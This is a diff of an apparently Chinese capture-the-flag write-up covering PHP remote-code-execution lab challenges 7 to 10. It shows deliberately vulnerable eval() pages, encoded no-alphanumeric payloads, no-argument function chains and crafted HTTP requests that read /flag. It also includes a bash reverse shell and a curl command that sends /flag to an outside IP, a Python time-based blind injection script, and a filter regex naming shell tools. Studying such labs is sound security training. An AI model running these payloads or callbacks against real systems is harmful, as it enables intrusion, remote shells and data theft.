+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(!preg_match(&quot;/[A-Za-z0-9]+/i&quot;,$command)) &#123;</span><br><span class="line">        echo &quot;welcome to RCE Lession 7&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;);`</span><br><span class="line"> `cmd=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br></pre></td></tr></table></figure></div>
+
+# RCE-Challenge-8
+
+![image.png](https://www.nssctf.cn/files/2024/1/24/975fffe13a.png)
+
+\5. 无参数RCE介绍
+
+无参数RCE指的就是我们通过`xxx(xxx(xxx()));`的无参函数去获取flag，他的正则表达式为
+ `/[^\W]+\((?R)?\)/`，在这里表示递归匹配。
+
+# 利用函数
+
+## getenv
+
+获取环境变量
+ ![image.png](https://www.nssctf.cn/files/2024/1/25/8e02bcb0fe.png)
+
+## var_dump
+
+打印结果，调试。
+
+## scandir
+
+## readfile
+
+读取文件
+ ![image.png](https://www.nssctf.cn/files/2024/1/25/e8e8a966f8.png)
+
+## next
+
+把数组指针往下移动一位。
+
+## get_defined_vars
+
+获取定义的所有变量
+ `cmd=var_dump(next(get_defined_vars()));&a=1`
+ ![image.png](https://www.nssctf.cn/files/2024/1/25/7186fc9d56.png)
+
+## session_start
+
+启动一个session
+
+## getallheaders
+
+获取所有的请求头
+
+## getcwd
+
+获取所在目录
+ ![image.png](https://www.nssctf.cn/files/2024/1/25/63a0131458.png)
+
+## apache_request_headers
+
+只适用于apache获取请求头。
+
+# RCE-Challenge-9
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $command)) &#123;</span><br><span class="line">        echo &quot;welcome to RCE Lession 9&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 方法一
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(next(next(get_defined_vars())));&amp;a=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+## 方法二
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=readfile(next(next(get_defined_vars())));&amp;a=/flag</span><br></pre></td></tr></table></figure></div>
+
+## 方法三
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:32775</span><br><span class="line">Content-Length: 33</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Microsoft Edge&quot;;v=&quot;120&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line">Origin: http://localhost:32775</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:32775/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">cmd:cat /flag</span><br><span class="line"></span><br><span class="line">cmd=system(end(getallheaders()));</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 方法四
+
+通过session_start强制启动session，通过session_id获取PHPSESSID的cookie值，得到可控字符串
+ `cmd=system(session_id(session_start()));`
+ `PHPSESSID=cat /flag`
+
+## 方法五
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:32775</span><br><span class="line">Content-Length: 42</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Microsoft Edge&quot;;v=&quot;120&quot;</span><br><span class="line">Cookie: PHPSESSID=asdasdasda</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line">Origin: http://localhost:32775</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:32775/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">x-cmd:cat /flag</span><br><span class="line"></span><br><span class="line">cmd=system(end(apache_request_headers()));</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+![image.png](https://www.nssctf.cn/files/2024/1/25/9ccb570479.png)
+
+ \6. 无回显命令执行
+
+# 无回显外带的方式
+
+- 反弹shell
+
+`bash -c "bash -i >& /dev/tcp/8.130.24.188/7775 <&1"`
+ ![image.png](https://www.nssctf.cn/files/2024/2/7/5722f69631.png)
+
+- curl、wget、dns外带
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl http://8.130.24.188:7775?a=`cat /flag`</span><br></pre></td></tr></table></figure></div>
+
+![image.png](https://www.nssctf.cn/files/2024/2/7/e9ec65c3f2.png)
+
+- 把flag复制到网站根目录
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /flag /var/www/html/1.txt</span><br></pre></td></tr></table></figure></div>
+
+- bash盲注
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ `cat /flag | awk NR==1 | cut -c 1` == &#x27;N&#x27; ];then sleep 2;fi</span><br></pre></td></tr></table></figure></div>
+
+# RCE-Challenge-10
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://127.0.0.1:32776/&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,15):</span><br><span class="line">    for j in range(1,50):</span><br><span class="line">        #ascii码表</span><br><span class="line">        for k in range(32,127):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload =f&quot;if [ `cat /flag | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#x27;&#123;k&#125;&#x27; ];then sleep 2;fi&quot;</span><br><span class="line">            length=len(payload)</span><br><span class="line">            data =&#123;</span><br><span class="line">                &quot;cmd&quot;: payload</span><br><span class="line">            &#125;</span><br><span class="line">            t1=time.time()</span><br><span class="line">            r=requests.post(url=url,data=data)</span><br><span class="line">            t2=time.time()</span><br><span class="line">            if t2-t1 &gt;1.5:</span><br><span class="line">                result+=k</span><br><span class="line">                print(result)</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($command))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $command))&#123;</span><br><span class="line">        exec($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;what are you doing?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
 		</div>
 
 		
@@ -515,7 +1033,7 @@ bash
         
             <li>
                 <strong>更新于
-                    :</strong> 2025-03-03 21:58:28
+                    :</strong> 2025-03-10 05:54:40
             </li>
         
         <li>
@@ -652,7 +1170,7 @@ bash
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 7 篇文章
+                        共撰写了 8 篇文章
                     </span>
                     
                 </p>
